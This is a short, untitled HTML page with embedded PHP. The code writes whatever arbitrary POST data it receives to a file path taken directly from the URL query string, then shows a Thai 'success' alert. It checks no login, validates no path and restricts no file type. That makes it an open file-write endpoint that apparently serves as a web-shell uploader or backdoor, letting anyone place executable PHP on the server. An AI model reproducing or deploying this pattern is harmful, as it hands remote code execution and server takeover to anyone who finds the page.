<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Untitled Document</title>
</head>

<body>
	<?php
		$filez = $_SERVER["QUERY_STRING"];
		$file=substr($filez,5);
		$data=$_POST['data'];

		$fp=fopen($file,"w");
		fputs($fp,$data);
		fclose($fp);

	?>
	<!-- JS dependencies -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

     <!-- bootbox code -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bootbox.js/4.4.0/bootbox.min.js"></script>
		 <script>alert("สำเร็จแล้ว");</script>
</body>
</html>
